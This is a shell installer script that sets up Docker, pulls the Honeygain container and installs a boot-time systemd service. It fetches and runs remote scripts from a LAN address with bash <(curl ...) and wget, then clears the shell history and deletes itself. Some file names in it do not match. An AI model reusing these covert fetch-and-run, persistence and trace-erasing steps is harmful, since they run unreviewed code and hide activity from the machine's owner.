#!/bin/sh
#00101000 00110000 00101011 00101000 00110001 00101010 00110011 00101001 00101001 00101010 00110010
version=0.0.3
remoteip=192.168.1.104
if [ -x "$(command -v docker)" ]; then
	echo "Docker already installed"
else
	echo "Installing docker"
	apt-get -y install docker.io
	apt-get -y install docker-ce docker-ce-cli containerd.io
	if [ -x "$(command -v docker)" ]; then
		echo "Installed"
	else
		echo "Retrying"
		curl -sSL https://get.docker.com | sh
	fi
	echo "Installing honeygain"
	docker pull honeygain/honeygain
fi
echo "Creating service"
dir="/var/gvg/"
bash <( curl -s "http://${remoteip}:8080/RemoteContent/Hg/"${version}"/Remove.sh" )
mkdir $dir
wget -O ${dir}rw.sh "http://${remoteip}:8080/RemoteContent/Hg/"${version}"/rwl.sh" 
ln -s ${dir}hw.service /etc/systemd/system
cat > ${dir}hw.service << ENDOFFILE
[Unit]
Description=hw
After=multi-user.target
[Service]
Type=simple
ExecStart=/bin/bash ${dir}rwl.sh
 
[Install]
WantedBy=multi-user.target
ENDOFFILE
echo "Setting up service"
systemctl enable hw.service
systemctl start hw.service
echo "Done"
history -c 
history -w
echo "Removed history"
echo "Auto deleting Installer"
echo "Bye!!!!!!!"
rm $0